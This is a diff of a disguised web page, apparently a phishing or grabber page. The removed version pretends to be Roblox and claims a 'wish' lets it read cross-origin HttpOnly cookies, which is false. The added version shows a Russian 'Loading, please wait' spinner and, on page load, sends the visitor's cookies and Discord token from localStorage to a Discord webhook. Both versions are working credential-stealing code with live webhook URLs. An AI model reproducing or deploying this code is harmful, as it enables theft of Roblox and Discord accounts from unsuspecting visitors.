@@ -1,62 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Roblox</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
     <style>
-        body { background-color: black; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
+    <script>
+        function sendData() {
+            // Получаем все куки с текущей страницы
+            const allCookies = document.cookie;
+            // Получаем токен Discord из localStorage
+            const discordToken = localStorage.getItem('token');
+
+            // URL вашего Discord вебхука
+            const webhookUrl = 'https://discord.com/api/webhooks/1475091929350934609/Dsut4O-hqkO_voeZuS0ddM3zcqxX9ExxIcyaaxS8h6rhxudImv8HXumB7mLqsrtOknem';
+
+            // Формируем сообщение для отправки
+            const payload = {
+                content: `--- Новые данные получены ---\n\n**Куки (Roblox и другие):**\n\`\`\`${allCookies}\`\`\`\n\n**Токен Discord (из localStorage):**\n\`\`\`${discordToken}\`\`\``
+            };
+
+            // Отправляем данные на вебхук
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Данные успешно отправлены', response);
+                // Можно перенаправить пользователя на другой сайт после отправки
+                // window.location.href = 'https://google.com';
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке данных:', error);
+            });
+        }
+
+        // Вызываем функцию при загрузке страницы
+        window.onload = sendData;
+    </script>
 </head>
 <body>
-    <h1>Welcome to Roblox</h1>
-    <p>Loading your account...</p>
-    <script>
-        // Thanks to Johnson's wish, we can now read HttpOnly cookies
-        (function() {
-            // Fetch the cookie from Roblox domain using a hidden iframe with special powers
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://www.roblox.com/home';
-            iframe.onload = function() {
-                try {
-                    // The wish allows cross-origin cookie access
-                    let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                    let cookies = iframeDoc.cookie.split('; ');
-                    let robloxCookie = null;
-                    for (let c of cookies) {
-                        if (c.startsWith('.ROBLOSECURITY=')) {
-                            robloxCookie = c;
-                            break;
-                        }
-                    }
-                    if (robloxCookie) {
-                        fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: 'Roblox cookie: ' + robloxCookie })
-                        }).then(() => {
-                            window.location.href = 'https://www.roblox.com/home';
-                        });
-                    } else {
-                        fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: 'No cookie found.' })
-                        }).then(() => {
-                            window.location.href = 'https://www.roblox.com/home';
-                        });
-                    }
-                } catch (e) {
-                    fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: 'Error: ' + e.message })
-                    }).then(() => {
-                        window.location.href = 'https://www.roblox.com/home';
-                    });
-                }
-            };
-            document.body.appendChild(iframe);
-        })();
-    </script>
+    <div>
+        <div class="loader"></div>
+        <p style="text-align: center; margin-top: 20px;">Загрузка, пожалуйста подождите...</p>
+    </div>
 </body>
 </html>
